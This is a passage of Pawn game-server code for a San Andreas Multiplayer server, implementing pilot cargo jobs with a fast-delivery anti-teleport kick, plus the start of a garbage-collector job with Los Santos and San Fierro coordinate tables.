		switch (GetVehicleModel(GetPlayerVehicleID(playerid)))
		{
			case VehicleShamal, VehicleNevada:
			{
				// Get a random LoadID from the pilot-products (only the planes)
				APlayerData[playerid][LoadID] = Product_GetRandom(PCV_PilotPlane);
				// Also get a random start-location and end-location
				APlayerData[playerid][JobLoc1] = Product_GetRandomStartLoc(APlayerData[playerid][LoadID]);
				APlayerData[playerid][JobLoc2] = Product_GetRandomEndLoc(APlayerData[playerid][LoadID]);

				// Make sure the destination is not closeby (pilot-locations are ALL includes in the array)
				while (Locations_CheckDistance(APlayerData[playerid][JobLoc1], APlayerData[playerid][JobLoc2], 1000.0) == 0)
				{
				    // If both locations are too close together, keep searching for a random delivery-location that's further away
				    APlayerData[playerid][JobLoc2] = Product_GetRandomEndLoc(APlayerData[playerid][LoadID]);
				}

				// Return 1 to indicate that a job has been set correctly
				return 1;
			}
		}
	}

	// If no job could be set correctly, return 0
	return 0;
}

// This function sets a random job for a helicopter vehicle and returns 2 if a job has been set
// The function returns 0 if a job couldn't be set (if the player is driving an invalid vehicle to start piloting-jobs)
Pilot_Heli_SetRandomJob(playerid)
{
	// If the player is the driver of the vehicle (GetPlayerVehicleSeat returns -1 if the player is not in a vehicle)
	if (GetPlayerVehicleSeat(playerid) == 0)
	{
		// Check the vehicle-model of the player to decide which job the player can get
		switch (GetVehicleModel(GetPlayerVehicleID(playerid)))
		{
			case VehicleMaverick, VehicleCargobob:
			{
				// Get a random LoadID from the pilot-products (only the helicopters)
				APlayerData[playerid][LoadID] = Product_GetRandom(PCV_PilotHelicopter);
				// Also get a random start-location and end-location
				APlayerData[playerid][JobLoc1] = Product_GetRandomStartLoc(APlayerData[playerid][LoadID]);
				APlayerData[playerid][JobLoc2] = Product_GetRandomEndLoc(APlayerData[playerid][LoadID]);

				// Make sure the destination is not closeby (pilot-locations are ALL includes in the array)
				while (Locations_CheckDistance(APlayerData[playerid][JobLoc1], APlayerData[playerid][JobLoc2], 1000.0) == 0)
				{
				    // If both locations are too close together, keep searching for a random delivery-location that's further away
				    APlayerData[playerid][JobLoc2] = Product_GetRandomEndLoc(APlayerData[playerid][LoadID]);
				}

				// Return 2 to indicate that a job has been set correctly
				return 2;
			}
		}
	}

	// If no job could be set correctly, return 0
	return 0;
}



// This function is called when a pilot enters a checkpoint
Pilot_OnPlayerEnterCheckpoint(playerid)
{
	new LoadMsg[128];

    // Check the jobstep
    switch (APlayerData[playerid][JobStep])
    {
		// JobStep is 1 (pilot is loading his goods at the checkpoint)
 		case 1: format(LoadMsg, 128, TXT_LoadingGoods, ALoads[APlayerData[playerid][LoadID]][LoadName]);
		// JobStep is 2 (pilot is unloading his goods at the checkpoint)
		case 2: format(LoadMsg, 128, TXT_UnloadingGoods, ALoads[APlayerData[playerid][LoadID]][LoadName]);
    }

	// Disable the player's actions (he cannot move anymore)
	TogglePlayerControllable(playerid, 0);

	// Check the vehiclemodel of the player
	new vehicleid = GetPlayerVehicleID(playerid);
	switch (GetVehicleModel(vehicleid))
	{
	    case VehicleShamal, VehicleNevada: // A plane needs 5 seconds to load/unload
		{
			// Show the message to inform him what he's doing (loading/unloading)
			GameTextForPlayer(playerid, LoadMsg, 5000, 5);
			// Start a timer (Public function "LoadUnload(playerid)" gets called when the timer runs out)
			APlayerData[playerid][LoadingTimer] = SetTimerEx("Pilot_Plane_LoadUnload", 5000, false, "d" , playerid);
		}
	    case VehicleMaverick, VehicleCargobob: // A helicopter only needs 3 seconds to load/unload
	    {
			// Show the message to inform him what he's doing (loading/unloading)
			GameTextForPlayer(playerid, LoadMsg, 3000, 3);
			// Start a timer (Public function "LoadUnload(playerid)" gets called when the timer runs out)
			APlayerData[playerid][LoadingTimer] = SetTimerEx("Pilot_Plane_LoadUnload", 3000, false, "d" , playerid);
			// When in a helicopter, turn off the engine so the helicopter lands and doesn't drift away with the wind
			new engine,lights,alarm,doors,bonnet,boot,objective;
			GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
	    }
	}

	return 1;
}



// After a pilot entered a checkpoint, a timer is created. This function is called when the timer runs out
public Pilot_Plane_LoadUnload(playerid)
{
	// Check the JobStep
	switch (APlayerData[playerid][JobStep])
	{
		case 1: // Player must load his goods
		{
		    // Setup local variables
			new StartLoc[50], EndLoc[50], Load[50], Float:x, Float:y, Float:z, UnloadMsg[100];
			// Set JobStep to 2 (unloading goods)
			APlayerData[playerid][JobStep] = 2;
			// Delete the loading-checkpoint
			DisablePlayerCheckpoint(playerid);
			// Get the startlocation, endlocation and the load texts
			format(StartLoc, 50, ALocations[APlayerData[playerid][JobLoc1]][LocationName]);
			format(EndLoc, 50, ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
			format(Load, 50, ALoads[APlayerData[playerid][LoadID]][LoadName]);

			// Grab the x, y, z positions for the second location (to unload the goods)
			x = ALocations[APlayerData[playerid][JobLoc2]][LocX];
			y = ALocations[APlayerData[playerid][JobLoc2]][LocY];
			z = ALocations[APlayerData[playerid][JobLoc2]][LocZ];
			// Create a checkpoint where the player should unload the goods
			SetPlayerCheckpoint(playerid, x, y, z, 7);
			// Inform the player that he must unload his goods
			format(UnloadMsg, 100, TXT_DeliverCargoTo, Load, EndLoc);
			SendClientMessage(playerid, 0xFFFFFFFF, UnloadMsg);

			GorevTime[playerid] = 0;
		}
		case 2: // Player is delivering his goods
		{
		    if(GorevTime[playerid] < 8)
		    {
		        new BanMSG[256];
		        //new TotalBanTime = (1 * 86400) + (0 * 3600) + gettime();
		        //APlayerData[playerid][BanTime] = TotalBanTime;

				format(BanMSG, 256, "{FF0000}%s{F8F8FF}, sunucudan tekmelendi. [ {FF0000}Teleport Hack {F8F8FF}]", GetName(playerid));
				SendClientMessageToAll(-1, BanMSG);
				SafeKick(playerid);
		        return 1;
		    }
			if(PilotUcak[playerid] != GetPlayerVehicleID(playerid))return SendErrorMessage(playerid, "Göreve baþladýðýnýz uçaktan farklý bir uçakla görevi bitiremezsiniz!");
		    // Setup local variables
			new StartLoc[50], EndLoc[50], Load[50], Msg1[255], Name[24];

			// Get the player name
			GetPlayerName(playerid, Name, sizeof(Name));
			// Get the startlocation, endlocation and the load texts
			format(StartLoc, 50, ALocations[APlayerData[playerid][JobLoc1]][LocationName]);
			format(EndLoc, 50, ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
			format(Load, 50, ALoads[APlayerData[playerid][LoadID]][LoadName]);

			// Construct the message sent to all players that this player completed a pilot mission
			format(Msg1, 255, TXT_PlayerCompletedPilotJob, Name, Load);
			//format(Msg2, 255, TXT_PlayerCompletedPilotJobInfo, StartLoc, EndLoc);
			SendClientMessageToAll(0xFFFFFFFF, Msg1);
			//SendClientMessageToAll(0xFFFFFFFF, Msg2);



		    // Setup local variables
			new Float:x1, Float:y1, Float:x2, Float:y2, Float:Distance, Message[128], Payment, Skor;
			// Grab the x, y, z positions for the first location (to load the goods)
			x1 = ALocations[APlayerData[playerid][JobLoc1]][LocX];
			y1 = ALocations[APlayerData[playerid][JobLoc1]][LocY];
			// Grab the x, y, z positions for the second location (to unload the goods)
			x2 = ALocations[APlayerData[playerid][JobLoc2]][LocX];
			y2 = ALocations[APlayerData[playerid][JobLoc2]][LocY];
			// Calculate the distance between both points
			Distance = floatsqroot(((x2 - x1) * (x2 - x1)) + ((y2 - y1) * (y2 - y1)));

			// Calculate the payment for the player
			Payment = floatround((Distance * ALoads[APlayerData[playerid][LoadID]][PayPerUnit]), floatround_floor);
			Skor = 1;

			if(VIP[playerid] == 1 || YVIP[playerid] == 1)
			{
  				Payment += 2*Payment;
  				Skor = 3;
			}

			// Pay the player based on the distance between the loading-point and unloading-point
			RewardPlayer(playerid, Payment, Skor);

			// Send a message to let the player know he finished his mission and got paid
			format(Message, 128, "{00FF00}Gorev tamamlandi! $%i ve 5 EXP kazandiniz!", Payment);
			SendClientMessage(playerid, 0xFFFFFFFF, Message);

			// Increase the stats for completing a pilot job
			APlayerData[playerid][StatsPilotJobs]++;
			format(Message, 1024, "Pilot görevini baþarýyla bitirdi");
			SqlLogYaz(playerid, 7, Message);
			
			EXP[playerid] = EXP[playerid] + 5;
			
			if(APlayerData[playerid][StatsPilotJobs] >= 5)
			{
				GivePlayerAchievement(playerid, PilotAch, 1); // Baþarým Sistemi
			}
			// Also save the data (in case the server crashes, progress would be lost)
			Oyuncu_Kaydet(playerid);

			// End the current pilot job (clear mission-data)
			Pilot_EndJob(playerid);
		}
	}

    // Enable the player again (he can move again)
	TogglePlayerControllable(playerid, 1);
	// Start the engine again (in case the vehicle was a helicopter, where the engine was turned off by entering a checkpoint)
/*	new vehicleid = GetPlayerVehicleID(playerid);
	new engine,lights,alarm,doors,bonnet,boot,objective;
	GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
	SetVehicleParamsEx(vehicleid, 1, lights, alarm, doors, bonnet, boot, objective);
*/
	return 1;
}



// This function is used to cleanup the current job
Pilot_EndJob(playerid)
{
	// Check if a job has started
	if (APlayerData[playerid][JobStarted] == true)
	{
		// Clear all data about the job from the player, so he can start a new one
		APlayerData[playerid][JobStarted] = false;
		APlayerData[playerid][JobStep] = 0;
		APlayerData[playerid][LoadID] = 0;
		APlayerData[playerid][JobLoc1] = 0;
		APlayerData[playerid][JobLoc2] = 0;
		
		PilotUcak[playerid] = -1;

		// Delete the checkpoint
		DisablePlayerCheckpoint(playerid);
		// Reset the missiontext
		//TextDrawSetString(APlayerData[playerid][MissionText], Pilot_NoJobText);
		// Kill the LoadingTimer
		KillTimer(APlayerData[playerid][LoadingTimer]);
	}

	return 1;
}
// ************************************************************************************************************************************************************
// PPC_MissionsCopcu [ Fusional Dream'dan Aktarýldý - Yapýmcý:EvoturK ]
// ************************************************************************************************************************************************************
#define SehirLosSantos                  	0
#define SehirSanFierro                      1
#define SehirBayside                        2
#define SehirLasVenturas                    3

enum CityInfo
{
	CityName[35],
	Float:CityMinX,
	Float:CityMinY,
	Float:CityMaxX,
	Float:CityMaxY
};

new Sehirler[4][CityInfo]={
{"Los Santos", -1228.114135, -3150.904785, 3038.955322, 454.851440}, // 1. Bölge
{"San Fierro", -3439.908691, -3150.904785, -1228.114135, 1583.512817}, // 1. Bölge
{"Bayside", -3439.908691, 1583.512817, -1228.114135, 3117.281982}, // 2. Bölge
{"Las Venturas", -1228.114135, 454.851440, 3038.955322, 3117.281982} // 2. Bölge
};


// GetPlayerSehir
GetPlayerSehir(playerid)
{
	new Sonuc, Float:oX, Float:oY, Float:oZ;
	GetPlayerPos(playerid, oX, oY, oZ);

	for(new i; i < sizeof(Sehirler); i++)
	{
	    if(oX > Sehirler[i][CityMinX] && oY > Sehirler[i][CityMinY] && oX < Sehirler[i][CityMaxX] && oY < Sehirler[i][CityMaxY])
	    {
	        Sonuc = i;
	        break;
	    }
	}

	return Sonuc;
}

// GetPlayerBolge
GetPlayerBolge(playerid)
{
	new Sonuc;

	switch(GetPlayerSehir(playerid))
	{
	    case 0: Sonuc = 1;
	    case 1: Sonuc = 1;
	    case 2: Sonuc = 2;
	    case 3: Sonuc = 2;
	    default: Sonuc = 1;
	}

	return Sonuc;
}

// GetPointSehir
GetPointSehir(Float:X, Float:Y, Float:Z)
{
	#pragma unused Z
	new Sonuc = -1;

	for(new i; i < sizeof(Sehirler); i++)
	{
	    if(X > Sehirler[i][CityMinX] && Y > Sehirler[i][CityMinY] && X < Sehirler[i][CityMaxX] && Y < Sehirler[i][CityMaxY])
	    {
	        Sonuc = i;
	        break;
	    }
	}

	return Sonuc;
}

new MeslekDurum[MAX_PLAYERS],
	MeslekSehir[MAX_PLAYERS];

enum LocGroupInfo
{
	LocGName[50],
	Locs[30]
};

enum LocInfo
{
	LocName[50],
	Float:LocX,
	Float:LocY,
	Float:LocZ
};

new CopAraba[MAX_PLAYERS],
	CopPickup[MAX_PLAYERS][10],
	CopMapIcon[MAX_PLAYERS][10],
	CopAlindi[MAX_PLAYERS][10],
	CopOrtak[MAX_PLAYERS],
	CopBolgesi[MAX_PLAYERS],
	ElindekiCop[MAX_PLAYERS];

new LSCopBolge[15][LocGroupInfo]={
{"Ganton", {0, 1, 2, 3, 4, 5, 6, 7, 8, 9}},
{"Idlewood", {10, 11, 12, 13, 14, 15, 16, 17, 18, 19}},
{"Jefferson", {20, 21, 22, 23, 24, 25, 26, 27, 28, 29}},
{"East Los Santos", {30, 31, 32, 33, 34, 35, 36, 37, 38, 39}},
{"East Beach", {40, 41, 42, 43, 44, 45, 46, 47, 48, 49}},
{"Los Colinas", {50, 51, 52, 53, 54, 55, 56, 57, 58, 59}},
{"Mulholland", {60, 61, 62, 63, 64, 65, 66, 67, 68, 69}},
{"Richman", {70, 71, 72, 73, 74, 75, 76, 77, 78, 79}},
{"Temple", {80, 81, 82, 83, 84, 85, 86, 87, 88, 89}},
{"Winewood", {90, 91, 92, 93, 94, 95, 96, 97, 98, 99}},
{"Rodeo", {100, 101, 102, 103, 104, 105, 106, 107, 108, 109}},
{"Marina", {110, 111, 112, 113, 114, 115, 116, 117, 118, 119}},
{"Commerce", {120, 121, 122, 123, 124, 125, 126, 127, 128, 129}},
{"El Corona", {130, 131, 132, 133, 134, 135, 136, 137, 138, 139}},
{"Ocean Docks", {140, 141, 142, 143, 144, 145, 146, 147, 148, 149}}
};

new LSCopYer[150][LocInfo]={
{"Ganton", 2444.0085,-1647.5450,13.4765}, // LScopcuganton1
{"Ganton", 2488.8569,-1685.1886,13.5087}, // LScopcuganton2
{"Ganton", 2397.4192,-1669.3688,13.5547}, // LScopcuganton3
{"Ganton", 2365.3457,-1670.4778,13.5469}, // LScopcuganton4
{"Ganton", 2378.1333,-1724.2094,13.5529}, // LScopcuganton5
{"Ganton", 2467.0645,-1739.4739,13.5469}, // LScopcuganton6
{"Ganton", 2402.0200,-1724.3402,13.5865}, // LScopcuganton7
{"Ganton", 2372.2161,-1757.3525,13.5430}, // LScopcuganton8
{"Ganton", 2333.6848,-1678.8119,13.5723}, // LScopcuganton9
{"Ganton", 2271.6982,-1651.4421,15.2789}, // LScopcuganton10

{"Idlewood", 2009.2433,-1648.9056,13.5469}, // LScopcuýddlewoold1
{"Idlewood", 2009.8243,-1707.0048,13.5547}, // LScopcuýddlewoold2
{"Idlewood", 2074.3110,-1702.7621,13.5547}, // LScopcuýddlewoold3
{"Idlewood", 2041.8032,-1619.1189,13.5469}, // LScopcuýdleewoold4
{"Idlewood", 2138.8826,-1617.0636,13.5647}, // LScopcuýdleewoold5
{"Idlewood", 2041.6980,-1744.9685,13.5469}, // LScopcuýdleewoold6
{"Idlewood", 2017.9991,-1759.7227,13.5469}, // LScopcuýdleewoold7
{"Idlewood", 1948.9817,-1706.2220,13.5469}, // LScopcuýdleewoold8
{"Idlewood", 1938.1660,-1605.1603,13.5391}, // LScopcuýdleewoold9
{"Idlewood", 1864.2197,-1605.4258,13.5391}, // LScopcuýdleewoold10

{"Jefferson", 2197.1633,-1377.4338,24.0000}, // LScopcujefforsan1
{"Jefferson", 2137.0940,-1413.9895,23.9836}, // LScopcujefforsan2
{"Jefferson", 2112.4492,-1376.4192,23.9766}, // LScopcujefforsan3
{"Jefferson", 2174.5527,-1343.0038,23.9844}, // LScopcujefforsan4
{"Jefferson", 2136.3169,-1307.9281,23.9922}, // LScopcujefforsan5
{"Jefferson", 2079.0913,-1341.1758,23.9844}, // LScopcujefforsan6
{"Jefferson", 2227.4458,-1227.8666,23.9713}, // LScopcujefforsan7
{"Jefferson", 2150.6482,-1227.9570,23.9766}, // LScopcujefforsan8
{"Jefferson", 2059.1467,-1273.2164,23.9766}, // LScopcujefforsan9
{"Jefferson", 2221.0457,-1393.4727,24.0000}, // LScopcujefforsan10

{"East Los Santos", 2504.2549,-1421.9502,28.5284}, // LScopcueastlossantos1
{"East Los Santos", 2503.9543,-1311.1664,34.8490}, // LScopcueastlossantos2
{"East Los Santos", 2505.4565,-1249.6255,35.0547}, // LScopcueastlossantos3
{"East Los Santos", 2577.9170,-1321.6477,41.1734}, // LScopcueastlossantos4
{"East Los Santos", 2574.2087,-1447.6136,24.0000}, // LScopcueastlossantos5
{"East Los Santos", 2405.6653,-1436.7920,24.0000}, // LScopcueastlossantos6
{"East Los Santos", 2379.1875,-1374.3979,24.0000}, // LScopcueastlossantos7
{"East Los Santos", 2363.8870,-1272.1904,23.9092}, // LScopcueastlossantos8
{"East Los Santos", 2459.0405,-1219.5044,30.4344}, // LScopcueastlossantos9
{"East Los Santos", 2595.7495,-1191.6108,62.5996}, // LScopcueastlossantos10

{"East Beach", 2744.4448,-1176.1917,69.4028}, // LScopcueastbeach1
{"East Beach", 2710.5100,-1265.7969,59.5160}, // LScopcueastbeach2
{"East Beach", 2745.0986,-1371.2240,41.1379}, // LScopcueastbeach3
{"East Beach", 2804.5144,-1480.2802,18.6537}, // LScopcueastbeach4
{"East Beach", 2864.4551,-1376.0884,11.0865}, // LScopcueastbeach5
{"East Beach", 2833.8882,-1189.3312,24.6140}, // LScopcueastbeach6
{"East Beach", 2816.1252,-1056.7441,26.3492}, // LScopcueastbeach7
{"East Beach", 2650.5696,-1445.4331,30.5317}, // LScopcueastbeach8
{"East Beach", 2650.1472,-1623.3771,10.8862}, // LScopcueastbeach9
{"East Beach", 2843.6653,-1649.0272,11.0442}, // LScopcueastbeach10

{"Los Colinas", 2537.6545,-1055.5961,69.5792}, // LScopculascolinas1
{"Los Colinas", 2503.0437,-1039.4813,68.9615}, // LScopculascolinas2
{"Los Colinas", 2430.8821,-1026.7390,54.1607}, // LScopculascolinas3
{"Los Colinas", 2281.9741,-1062.4714,47.6851}, // LScopculascolinas4
{"Los Colinas", 2175.6030,-999.7349,62.9703}, // LScopculascolinas5
{"Los Colinas", 2255.1191,-1061.0271,50.3342}, // LScopculascolinas6
{"Los Colinas", 2530.5776,-1098.9955,58.2765}, // LScopculascolinas7
{"Los Colinas", 2408.2034,-1096.0125,39.5368}, // LScopculascolinas8
{"Los Colinas", 2348.7729,-1162.3888,27.3402}, // LScopculascolinas9
{"Los Colinas", 2310.2393,-1217.0590,23.9661}, // LScopculascolinas10

{"Mulholland", 1448.8103,-937.5083,36.2275}, // LScopcumulholland1
{"Mulholland", 1338.4272,-920.0016,35.8576}, // LScopcumulholland2
{"Mulholland", 1495.4036,-884.5009,59.7352}, // LScopcumulholland3
{"Mulholland", 1465.3605,-731.2807,93.3701}, // LScopcumulholland4
{"Mulholland", 1406.1758,-642.3354,89.0022}, // LScopcumulholland5
{"Mulholland", 1280.2552,-612.4837,102.3174}, // LScopcumulholland6
{"Mulholland", 1065.3276,-624.2377,115.7317}, // LScopcumulholland7
{"Mulholland", 1021.8087,-793.2554,102.1968}, // LScopcumulholland8
{"Mulholland", 868.3161,-855.0724,77.4286}, // LScopcumulholland9
{"Mulholland", 1239.9901,-740.4565,95.6541}, // LScopcumulholland10

{"Richman", 719.4180,-1000.7245,52.3972}, // LScopcumrýchman1
{"Richman", 571.1027,-1056.5643,73.9279}, // LScopcumrýchman2
{"Richman", 400.2920,-1163.3380,78.7181}, // LScopcumrýchman3
{"Richman", 568.5283,-1132.1199,50.6797}, // LScopcumrýchman4
{"Richman", 316.4379,-1194.4895,76.2267}, // LScopcumrýchman5
{"Richman", 285.7693,-1260.4144,73.7559}, // LScopcumrýchman6
{"Richman", 265.3749,-1328.8214,53.3457}, // LScopcumrýchman7
{"Richman", 201.7597,-1382.8763,48.9447}, // LScopcumrýchman8
{"Richman", 241.9659,-1022.8551,57.5644}, // LScopcumrýchman9
{"Richman", 526.0739,-1209.6702,44.2701}, // LScopcumrýchman10

{"Temple", 1347.0305,-997.8581,28.1199}, // LScopcutemple1
{"Temple", 1308.4504,-1045.9757,30.3347}, // LScopcutemple2
{"Temple", 1220.4663,-1047.0458,31.9207}, // LScopcutemple3
{"Temple", 1127.0684,-1047.1409,31.8915}, // LScopcutemple4
{"Temple", 1045.2222,-1046.8440,31.7677}, // LScopcutemple5
{"Temple", 969.9464,-1100.9707,23.8824}, // LScopcutemple6
{"Temple", 1341.2982,-1083.1506,24.5868}, // LScopcutemple7
{"Temple", 1254.0305,-1156.7334,23.8281}, // LScopcutemple8
{"Temple", 1128.1198,-1156.5496,23.8281}, // LScopcutemple9
{"Temple", 970.5880,-1156.1486,23.8526}, // LScopcutemple10

{"Winewood", 785.3802,-1327.0640,13.5469}, // LScopcuwýnewood1
{"Winewood", 664.5195,-1313.6836,13.4609}, // LScopcuwýnewood2
{"Winewood", 618.7192,-1327.4387,13.7115}, // LScopcuwýnewood3
{"Winewood", 687.0183,-1182.5028,15.3721}, // LScopcuwýnewood4
{"Winewood", 761.9122,-1041.0757,23.8683}, // LScopcuwýnewood5
{"Winewood", 908.3218,-992.2324,37.7691}, // LScopcuwýnewood6
{"Winewood", 955.3658,-1095.9985,23.7730}, // LScopcuwýnewood7
{"Winewood", 790.2796,-1136.9091,23.8281}, // LScopcuwýnewood8
{"Winewood", 618.8121,-1427.8175,13.9715}, // LScopcuwýnewood9
{"Winewood", 447.4308,-1305.7280,15.2075}, // LScopcuwýnewood10

{"Rodeo", 504.0476,-1359.1060,16.1252}, // LScopcureode1
{"Rodeo", 578.7592,-1417.1484,14.2914}, // LScopcurodeo2
{"Rodeo", 491.1452,-1501.6924,20.5144}, // LScopcurodeo3
{"Rodeo", 448.5134,-1362.3068,23.6431}, // LScopcurodeo4
{"Rodeo", 417.3975,-1495.1245,31.1408}, // LScopcurodeo5
{"Rodeo", 472.6201,-1604.4840,24.8078}, // LScopcurodeo6
{"Rodeo", 383.1579,-1656.4745,32.5486}, // LScopcurodeo7
{"Rodeo", 362.1193,-2020.6266,7.8359}, // LScopcurodeo8
{"Rodeo", 273.3839,-1586.1163,33.1712}, // LScopcurodeo9
{"Rodeo", 645.6238,-1619.3457,15.1360}, // LScopcurodeo10

{"Marina", 645.6463,-1693.9906,14.8963}, // LScopcmarýna1
{"Marina", 663.5822,-1762.2493,13.6273}, // LScopcmarýna2
{"Marina", 791.6417,-1666.9908,13.4927}, // LScopcmarýna3
{"Marina", 817.8514,-1606.0083,13.5469}, // LScopcmarýna4
{"Marina", 688.4223,-1595.0514,14.1159}, // LScopcmarýna5
{"Marina", 759.4637,-1664.1954,4.1765}, // LScopcmarýna6
{"Marina", 782.8455,-1487.4747,13.5424}, // LScopcmarýna7
{"Marina", 867.3347,-1483.2562,13.5973}, // LScopcmarýna8
{"Marina", 954.2900,-1563.7534,13.5683}, // LScopcmarýna9
{"Marina", 780.8316,-1791.6986,13.0598}, // LScopcmarýna10

{"Commerce", 1576.8270,-1757.7548,13.5469}, // LScopcýtýcaret1
{"Commerce", 1535.7238,-1661.9301,13.5469}, // LScopcýtýcaret2
{"Commerce", 1419.8551,-1650.2758,13.3814}, // LScopcýtýcaret3
{"Commerce", 1375.2379,-1579.3081,13.5469}, // LScopcýtýcaret4
{"Commerce", 1365.0447,-1724.2751,13.5469},// LScopcýtýcaret5
{"Commerce", 1340.2794,-1773.2366,13.5244}, // LScopcýtýcaret6
{"Commerce", 1278.6555,-1844.8481,13.5555}, // LScopcýtýcaret7
{"Commerce", 1340.2701,-1955.6384,30.4515}, // LScopcýtýcaret8
{"Commerce", 1286.4685,-2048.6187,58.9029}, // LScopcýtýcaret9
{"Commerce", 1625.3588,-1647.6943,13.7115}, // LScopcýtýcaret10

{"El Corona", 1969.5215,-1974.9181,13.5469}, // LScopcuelcorona1
{"El Corona", 1970.0327,-2057.9958,13.3893}, // LScopcuelcorona2
{"El Corona", 1910.6862,-2045.2969,13.5469}, // LScopcuelcorona3
{"El Corona", 1935.7440,-1925.1704,13.5469}, // LScopcuelcorona4
{"El Corona", 1915.8340,-2155.6655,13.5452}, // LScopcuelcorona5
{"El Corona", 1914.8430,-2101.6670,13.6025}, // LScopcuelcorona6
{"El Corona", 1830.1497,-2100.5723,13.5469}, // LScopcuelcorona7
{"El Corona", 1672.1532,-2113.0125,13.5469}, // LScopcuelcorona8
{"El Corona", 1969.5634,-1883.0896,13.5469}, // LScopcuelcorona9
{"El Corona", 1898.0054,-1883.0536,13.4821}, // LScopcuelcorona10

{"Ocean Docks", 2010.4438,-2117.5735,13.5469}, // LScopcuoceandocks1
{"Ocean Docks", 2050.7317,-1980.5166,13.5545}, // LScopcuoceandocks2
{"Ocean Docks", 2218.0237,-2134.4941,13.5391}, // LScopcuoceandocks3
{"Ocean Docks", 2048.9089,-2159.2832,13.5469}, // LScopcuoceandocks4
{"Ocean Docks", 2335.4797,-2090.8225,13.5469}, // LScopcuoceandocks5
{"Ocean Docks", 2303.5112,-2016.3137,13.5430}, // LScopcuoceandocks6
{"Ocean Docks", 2224.1318,-1938.2587,13.5363}, // LScopcuoceandocks7
{"Ocean Docks", 2244.2754,-2199.2117,13.5469}, // LScopcuoceandocks8
{"Ocean Docks", 2200.7871,-2082.9849,7.9844}, // LScopcuoceandocks9
{"Ocean Docks", 2390.9646,-2284.9727,6.0625} // LScopcuoceandocks10
};

new SFCopBolge[5][LocGroupInfo]={
{"Garcia", {0, 1, 2, 3, 4, 5, 6, 7, 8, 9}},
{"Ocean Flats", {10, 11, 12, 13, 14, 15, 16, 17, 18, 19}},
{"Chinatown", {20, 21, 22, 23, 24, 25, 26, 27, 28, 29}},
{"Juniper Hollow", {30, 31, 32, 33, 34, 35, 36, 37, 38, 39}},
{"Downtown", {40, 41, 42, 43, 44, 45, 46, 47, 48, 49}}
};

new SFCopYer[50][LocInfo]={
	{"Garcia", -2236.34,  161.19,   35.32}, // ID = 0
	{"Garcia", -2235.24,  110.28,   35.32}, // ID = 1
	{"Garcia", -2286.32,   38.49,   35.31}, // ID = 2
	{"Garcia", -2213.89,   22.70,   35.32}, // ID = 3
	{"Garcia", -2291.48,  -22.71,   35.32}, // ID = 4
	{"Garcia", -2217.06,  -82.61,   35.32}, // ID = 5
	{"Garcia", -2179.14, -115.74,   35.32}, // ID = 6
	{"Garcia", -2244.24, -102.65,   35.31}, // ID = 7
	{"Garcia", -2272.32, -118.20,   35.32}, // ID = 8
	{"Garcia", -2310.19,  -58.53,   35.31}, // ID = 9
	{"Ocean Flats", -2756.13,  -85.29,    7.03}, // ID = 10
	{"Ocean Flats", -2757.94, -136.46,    6.94}, // ID = 11
	{"Ocean Flats", -2755.51, -178.36,    6.91}, // ID = 12
	{"Ocean Flats", -2762.14,  -13.73,    6.94}, // ID = 13
	{"Ocean Flats", -2761.77,   63.98,    6.95}, // ID = 14
	{"Ocean Flats", -2761.44,  115.26,    6.94}, // ID = 15
	{"Ocean Flats", -2719.21,   74.58,    4.33}, // ID = 16
	{"Ocean Flats", -2654.11,   71.81,    4.06}, // ID = 17
	{"Ocean Flats", -2653.36,  132.58,    4.17}, // ID = 18
	{"Ocean Flats", -2712.25,  -32.57,    4.32}, // ID = 19
	{"Chinatown", -2217.66,  638.60,   49.45}, // ID = 20
	{"Chinatown", -2231.74,  738.16,   49.41}, // ID = 21
	{"Chinatown", -2154.09,  705.70,   69.56}, // ID = 22
	{"Chinatown", -2127.39,  650.94,   52.36}, // ID = 23
	{"Chinatown", -2160.78,  575.66,   35.17}, // ID = 24
	{"Chinatown", -2095.47,  683.29,   62.39}, // ID = 25
	{"Chinatown", -2102.51,  649.58,   52.36}, // ID = 26
	{"Chinatown", -2281.43,  581.32,   35.16}, // ID = 27
	{"Chinatown", -2287.06,  676.04,   48.30}, // ID = 28
	{"Chinatown", -2320.98,  729.13,   47.65}, // ID = 29
	{"Juniper Hollow", -2373.82, 1119.96,   55.72}, // ID = 30
	{"Juniper Hollow", -2427.40, 1136.09,   55.72}, // ID = 31
	{"Juniper Hollow", -2502.93, 1137.18,   55.72}, // ID = 32
	{"Juniper Hollow", -2591.14, 1153.61,   55.47}, // ID = 33
	{"Juniper Hollow", -2446.19, 1078.74,   55.75}, // ID = 34
	{"Juniper Hollow", -2409.21, 1002.25,   46.10}, // ID = 35
	{"Juniper Hollow", -2355.23,  981.30,   50.69}, // ID = 36
	{"Juniper Hollow", -2415.77,  943.84,   45.43}, // ID = 37
	{"Juniper Hollow", -2399.78,  891.13,   45.44}, // ID = 38
	{"Juniper Hollow", -2450.44,  816.99,   35.17}, // ID = 39
	{"Downtown", -1806.11,  826.65,   25.01}, // ID = 40
	{"Downtown", -1761.12,  761.83,   24.89}, // ID = 41
	{"Downtown", -1732.55,  907.28,   24.89}, // ID = 42
	{"Downtown", -1739.15,  957.65,   24.88}, // ID = 43
	{"Downtown", -1783.92, 1009.68,   24.89}, // ID = 44
	{"Downtown", -1881.74,  908.46,   35.17}, // ID = 45
	{"Downtown", -1987.93,  873.85,   45.20}, // ID = 46
	{"Downtown", -1911.65,  792.66,   39.53}, // ID = 47
	{"Downtown", -1908.84,  704.47,   45.44}, // ID = 48
	{"Downtown", -1703.41,  707.46,   24.89} // ID = 49
};

// StartCopcuGorev
StartCopcuGorev(playerid)
{
	if(APlayerData[playerid][PlayerClass] != ClassCopcu) return Hata(playerid, "Bu görevi yapabilmek için çöpçü olmanýz gerekiyor!");
	if(MeslekDurum[playerid] != 0) return Hata(playerid, "Þuan çöpçülük görevi yapýyorsunuz!");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return Hata(playerid, "Görev baþlatabilmek için çöp kamyonunu sürüyor olmanýz gerekiyor!");
	if(GetVehicleModel( GetPlayerVehicleID(playerid) ) != 408) return Hata(playerid, "Çöp kamyonunda deðilsiniz!");
	CopOrtak[playerid] = -1;

	foreach(new o:Player)
	{
	    if(o == playerid) continue;
	    if(APlayerData[o][PlayerClass] != ClassCopcu) continue;
	    if(MeslekDurum[o] != 0) continue;
	    if(!IsPlayerInAnyVehicle(o)) continue;
